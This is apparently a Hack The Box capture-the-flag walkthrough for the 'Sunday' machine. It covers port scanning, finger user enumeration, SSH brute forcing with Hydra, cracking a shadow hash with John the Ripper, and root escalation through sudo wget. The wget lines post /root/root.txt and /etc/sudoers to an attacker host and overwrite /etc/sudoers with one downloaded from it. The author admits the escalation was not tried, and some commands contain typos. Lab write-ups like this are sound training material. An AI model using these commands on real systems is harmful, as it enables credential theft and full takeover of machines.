# Sunday HTB, IP address:10.10.10.76

# Initial Enumeration

*1.nmap -sC -sV 10.10.10.76*


*2. ./nmapAutomator.sh 10.10.10.76 Full*


Nmap full port scan: nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
55029/tcp open  unknown

Running a specific port scan:
nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7

Results:
Port 22022: is running SunSSH 1.3
Port 55029: is running a service that nmap was not able to identify

------------------------------------------------------------------------------------------------------------------------
#Port Enumeration

1.Enumerating finger service
   Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

finger @10.10.10.76


perl finger-user-enum.pl -U user.txt -t 10.10.10.76
                                                     


2. Port 22
Connecting on port 22
From the nmap automator script we found out that SSH service is running on port 22.

ssh sunny@10.10.10.76 -p 22022
  Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

  Notes:
  This particular error happens while the encrypted channel is being set up. If your system and the remote system don't share at least one cipher, there is no cipher to agree on and no encrypted channel is possible. Usually SSH servers will offer a small handful of different ciphers in order to cater to different clients

ssh sunny@10.10.10.76 -p 22022 -oKexAlgorithms=diffie-hellman-group1-sha1
OR
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc sunny@10.10.10.76

I will brute force with several wordlists

HYDRA
hydra -V -I -l sunny -P ‘/usr/share/wordlists/rockyou.txt’ 10.10.10.76 ssh -s 22022




 Finally “sunday” seems to be the password.

#LATERAL MOVEMENT SUNNY → SAMMY
ssh sunny@10.10.10.76
I found a backup file in the following directory. 
It contains two files agen22.backup and shadow.backup. The former we don’t have access to, however, we can view the latter.



copy sammy's hash password to a hash.txt file
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::

JOHN THE RIPPER

john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt 


------------------------------------------------------------------------------------------------------------------------------------------------------------
#Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


A) GTFOBins wget

First attempt: Gaining a nc shell on attacker machine
 We can use the wget –post-file parameter to post the contents of root.txt. Let’s see if that works. We spin up a Netcat listener on port 80 on our attacker machine
 sudo wget –post-file=/root/root.txt attacker machine



We can capture the flag that way, but let’s do something else with these elevated privileges to get a root shell on the box.
B) Change sudoers file permissions and make sammy's rights ALL
 
 What if we post the /etc/sudoers file and make Sammy or Sunny execute anything as root? Let’s first see the contents of /etc/sudoers. 
<<sudo wget –post-file=/etc/sudoers <attacker machine ip>>>


Copying the contents of /etc/sudoers into sudoers and changing the permissions of Sammy to ALL=(root) NOPASSWD: ALL as shown below.
Collecting this file and installing it as /etc/sudoers, since wget is running as root effectively.
sudo wget -O /etc/sudoers http://<attcker_ip:8000/sudoers
Now we can see that with just one command, Sammy becomes root and take complete control of the box.


*Disclaimer: I did not do the Privilege Escalation part because of SSH LAG.*

 
